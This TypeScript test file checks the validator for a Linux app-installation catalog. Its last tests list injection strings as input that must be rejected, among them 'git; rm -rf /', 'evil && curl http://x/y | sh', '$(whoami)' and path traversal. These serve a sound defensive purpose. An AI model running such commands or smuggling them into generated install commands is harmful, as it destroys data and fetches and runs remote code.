import assert from 'node:assert/strict';
import { test } from 'node:test';
import { APPLICATIONS } from './applications.ts';
import { CATEGORIES, DISTROS, type Application } from './types.ts';
import { validateCatalog } from './validate.ts';

function app(overrides: Partial<Application> = {}): Application {
  return {
    id: 'example-app',
    name: 'Example App',
    description: 'An example application.',
    category: 'Utilities',
    homepage: 'https://example.com',
    installation: [],
    ...overrides,
  };
}

test('the real catalog is valid', () => {
  assert.deepEqual(validateCatalog(APPLICATIONS), []);
});

test('the real catalog is non-trivial and every entry uses a known category', () => {
  assert.ok(APPLICATIONS.length >= 30, `expected at least 30 applications, got ${APPLICATIONS.length}`);
  for (const entry of APPLICATIONS) {
    assert.ok(CATEGORIES.includes(entry.category), `${entry.id} has category ${entry.category}`);
  }
});

test('every category has at least one application', () => {
  for (const category of CATEGORIES) {
    const count = APPLICATIONS.filter((entry) => entry.category === category).length;
    assert.ok(count > 0, `category ${category} has no applications`);
  }
});

test('rejects duplicate application ids', () => {
  const errors = validateCatalog([app(), app({ name: 'Other' })]);
  assert.ok(errors.some((error) => error.includes('duplicate application id')));
});

test('rejects duplicate application names', () => {
  const errors = validateCatalog([app(), app({ id: 'other-app' })]);
  assert.ok(errors.some((error) => error.includes('duplicate application name')));
});

test('rejects unknown categories', () => {
  const errors = validateCatalog([app({ category: 'Games' as Application['category'] })]);
  assert.ok(errors.some((error) => error.includes('unknown category')));
});

test('rejects empty names and descriptions', () => {
  const errors = validateCatalog([app({ name: '  ', description: '' })]);
  assert.ok(errors.some((error) => error.includes('empty name')));
  assert.ok(errors.some((error) => error.includes('empty description')));
});

test('rejects non-slug ids', () => {
  const errors = validateCatalog([app({ id: 'Not A Slug' })]);
  assert.ok(errors.some((error) => error.includes('lowercase slug')));
});

test('rejects malformed homepages', () => {
  assert.ok(
    validateCatalog([app({ homepage: 'notaurl' })]).some((error) => error.includes('malformed homepage')),
  );
  assert.ok(
    validateCatalog([app({ homepage: 'http://example.com' })]).some((error) =>
      error.includes('malformed homepage'),
    ),
  );
});

test('rejects empty installation identifiers', () => {
  const errors = validateCatalog([
    app({ installation: [{ method: 'apt', identifier: '', distros: ['Ubuntu'], origin: 'distro' }] }),
  ]);
  assert.ok(errors.some((error) => error.includes('empty installation identifier')));
});

test('rejects the same identifier twice under one method', () => {
  const errors = validateCatalog([
    app({
      installation: [
        { method: 'apt', identifier: 'foo', distros: ['Ubuntu'], origin: 'distro' },
        { method: 'apt', identifier: 'foo', distros: ['Debian'], origin: 'vendor' },
      ],
    }),
  ]);
  assert.ok(errors.some((error) => error.includes('duplicate installation identifier')));
});

test('allows one method to have several distinct sources', () => {
  const errors = validateCatalog([
    app({
      installation: [
        { method: 'apt', identifier: 'foo-ce', distros: ['Ubuntu', 'Debian'], origin: 'vendor' },
        { method: 'apt', identifier: 'foo.io', distros: ['Ubuntu', 'Debian'], origin: 'distro' },
      ],
    }),
  ]);
  assert.deepEqual(errors, []);
});

test('rejects unknown installation methods', () => {
  const errors = validateCatalog([
    app({ installation: [{ method: 'brew' as never, identifier: 'foo', origin: 'distro' }] }),
  ]);
  assert.ok(errors.some((error) => error.includes('unknown installation method')));
});

test('rejects unknown origins', () => {
  const errors = validateCatalog([
    app({ installation: [{ method: 'flatpak', identifier: 'com.example.App', origin: 'pirate' as never }] }),
  ]);
  assert.ok(errors.some((error) => error.includes('unknown origin')));
});

test('rejects unknown distributions', () => {
  const errors = validateCatalog([
    app({
      installation: [
        { method: 'apt', identifier: 'foo', distros: ['Gentoo' as never], origin: 'distro' },
      ],
    }),
  ]);
  assert.ok(errors.some((error) => error.includes('unknown distribution')));
});

test('rejects a package manager paired with a distro that does not use it', () => {
  const errors = validateCatalog([
    app({
      installation: [
        { method: 'dnf', identifier: 'foo', distros: ['Arch Linux'], origin: 'distro' },
      ],
    }),
  ]);
  assert.ok(errors.some((error) => error.includes('does not apply to Arch Linux')));
});

test('requires distro-specific methods to declare the distros they are verified for', () => {
  const errors = validateCatalog([
    app({ installation: [{ method: 'dnf', identifier: 'foo', origin: 'distro' }] }),
  ]);
  assert.ok(errors.some((error) => error.includes('must list the distros')));
});

test('rejects distros on distribution-agnostic methods', () => {
  const errors = validateCatalog([
    app({
      installation: [
        { method: 'flatpak', identifier: 'com.example.App', origin: 'vendor', distros: ['Ubuntu'] },
      ],
    }),
  ]);
  assert.ok(errors.some((error) => error.includes('distribution-agnostic')));
});

test('accepts a well-formed entry', () => {
  const errors = validateCatalog([
    app({
      installation: [
        { method: 'apt', identifier: 'foo', distros: ['Ubuntu', 'Debian'], origin: 'distro' },
        { method: 'flatpak', identifier: 'com.example.Foo', origin: 'community' },
        {
          method: 'official',
          identifier: 'foo',
          origin: 'vendor',
          url: 'https://example.com/download',
        },
      ],
    }),
  ]);
  assert.deepEqual(errors, []);
});

test('distro-specific sources only claim distros that use that package manager', () => {
  const expected: Record<string, readonly string[]> = {
    apt: ['Ubuntu', 'Debian'],
    dnf: ['Fedora'],
    pacman: ['Arch Linux'],
  };
  for (const entry of APPLICATIONS) {
    for (const source of entry.installation) {
      const allowed = expected[source.method];
      if (!allowed) continue;
      for (const distro of source.distros ?? []) {
        assert.ok(
          allowed.includes(distro),
          `${entry.id}: ${source.method} cannot apply to ${distro}`,
        );
        assert.ok(DISTROS.includes(distro));
      }
    }
  }
});

test('verification metadata is optional, and present entries use a plain binary name', () => {
  const withVerify = APPLICATIONS.filter((entry) => entry.verify !== undefined);
  assert.ok(withVerify.length > 0, 'expected at least some entries to carry a binary name');

  for (const entry of withVerify) {
    assert.match(
      entry.verify!.binary,
      /^[A-Za-z0-9][A-Za-z0-9._+-]*$/,
      `${entry.id}: verify.binary must be a plain executable name`,
    );
  }
});

test('an entry with no package-manager or snap route carries no binary name', () => {
  // Flatpak-only and official-only applications put nothing predictable on
  // PATH, so claiming a binary for them would be inventing data.
  for (const entry of APPLICATIONS) {
    const hasPathRoute = entry.installation.some((source) =>
      ['apt', 'dnf', 'pacman', 'snap'].includes(source.method),
    );
    if (!hasPathRoute) {
      assert.equal(
        entry.verify,
        undefined,
        `${entry.id} has no PATH-installing route but claims a binary`,
      );
    }
  }
});

test('validateCatalog rejects a binary name that could reach a shell', () => {
  for (const binary of [
    'git; rm -rf /',
    'git && curl evil.sh',
    '$(whoami)',
    '`id`',
    'git | sh',
    'two words',
    '../../bin/sh',
    '-rf',
    '',
  ]) {
    const errors = validateCatalog([app({ verify: { binary } })]);
    assert.ok(
      errors.length > 0,
      `expected verify.binary ${JSON.stringify(binary)} to be rejected`,
    );
  }
});

test('validateCatalog accepts ordinary binary names', () => {
  for (const binary of ['git', 'nvim', 'google-chrome-stable', 'gimp', 'node', 'obs', 'g++']) {
    assert.deepEqual(validateCatalog([app({ verify: { binary } })]), [], binary);
  }
});

test('validateCatalog rejects an installation identifier that could reach a shell', () => {
  // The identifier is the *other* catalog field interpolated into a generated
  // command. `renderPlan` re-checks it against the same alphabet and refuses to
  // build a command — but only at plan time, as a thrown error on a user's
  // request. Catching it here makes bad data a validation failure instead, which
  // is what the catalog test suite and the `/health` integrity check can see.
  for (const identifier of [
    'evil; rm -rf /',
    'evil && curl http://x/y | sh',
    '$(whoami)',
    '`id`',
    'pkg | sh',
    'two words',
    '../../bin/sh',
    '-rf',
    'pkg\nother',
  ]) {
    const errors = validateCatalog([
      app({ installation: [{ method: 'apt', identifier, origin: 'distro', distros: ['Ubuntu'] }] }),
    ]);
    assert.ok(
      errors.length > 0,
      `expected identifier ${JSON.stringify(identifier)} to be rejected`,
    );
  }
});

test('validateCatalog accepts every identifier form the catalog actually uses', () => {
  // Package names with dots and pluses, reverse-DNS Flatpak ids, Snap names.
  for (const identifier of [
    'git',
    'docker.io',
    'docker-ce',
    'g++',
    'org.mozilla.firefox',
    'com.visualstudio.code',
    'sublime-text',
    'firefox-esr',
  ]) {
    const errors = validateCatalog([
      app({ installation: [{ method: 'flatpak', identifier, origin: 'vendor' }] }),
    ]);
    assert.deepEqual(errors, [], `expected ${identifier} to be accepted`);
  }
});
